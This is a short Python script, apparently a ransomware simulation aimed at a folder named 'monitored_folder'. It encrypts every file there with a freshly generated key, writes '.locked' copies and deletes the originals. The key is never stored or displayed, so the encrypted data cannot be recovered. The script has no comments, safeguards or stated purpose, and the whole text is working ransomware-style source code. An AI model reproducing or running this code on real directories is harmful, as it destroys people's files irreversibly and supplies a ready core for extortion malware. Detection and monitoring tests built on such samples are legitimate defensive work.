import os
from cryptography.fernet import Fernet

KEY = Fernet.generate_key()
cipher = Fernet(KEY)

FOLDER = "monitored_folder"

for file in os.listdir(FOLDER):
    path = os.path.join(FOLDER, file)

    if os.path.isfile(path) and not file.endswith(".locked"):
        with open(path, "rb") as f:
            data = f.read()

        encrypted = cipher.encrypt(data)

        with open(path + ".locked", "wb") as f:
            f.write(encrypted)

        os.remove(path)
        print("Encrypted:", file)
